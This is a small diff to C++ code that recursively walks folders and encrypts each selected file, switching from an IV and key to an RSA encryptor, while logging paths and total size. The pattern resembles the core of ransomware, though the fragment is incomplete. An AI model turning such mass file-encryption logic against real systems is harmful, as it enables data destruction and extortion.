@@ -81,7 +81,7 @@ void iterate(const path& parent, Processing_func process, PBYTE iv, PBYTE key) {
 	}
 }
 
-void iterate2(const path& parent, Processing_func process, PBYTE iv, PBYTE key,
+void iterate2(const path& parent, Processing_func process, RsaEncryptor rsaEncryptor,
 	std::vector<string> processedPaths)
 {
 	string path;
@@ -94,12 +94,12 @@ void iterate2(const path& parent, Processing_func process, PBYTE iv, PBYTE key,
 		if (is_directory(itr->status()) && !symbolic_link_exists(itr->path())) {
 			if (is_valid_folder(path))
 			{
-				iterate2(path, process, iv, key, processedPaths);
+				iterate2(path, process, rsaEncryptor, processedPaths);
 			}
 		}
 		else {
 			if (!do_encrypt(path)) continue;//see TODO 2 rows below
-			process(path, iv, key);
+			process(path, rsaEncryptor);
 			//TODO consider adding to "process" of encrypt, will cause an ugly wrapper for decrypt
 			processedPaths.push_back(path);
 			sumSize += file_size(path);
